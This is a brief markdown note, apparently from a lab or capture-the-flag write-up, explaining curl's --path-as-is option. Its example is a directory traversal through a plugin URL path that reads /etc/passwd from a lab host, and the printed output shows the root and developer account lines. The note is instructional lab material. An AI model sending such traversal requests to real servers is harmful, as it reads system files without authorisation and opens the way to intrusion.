### curl usage

##### --path-as-is
```
# --path-as-is         Do not squash .. sequences in URL path

$ curl http://10.10.11.183:3000/public/plugins/zipkin/../../../../../../../../../../../../../etc/passwd
<a href="/login">Found</a>.

$ curl --path-as-is http://10.10.11.183:3000/public/plugins/zipkin/../../../../../../../../../../../../../etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```
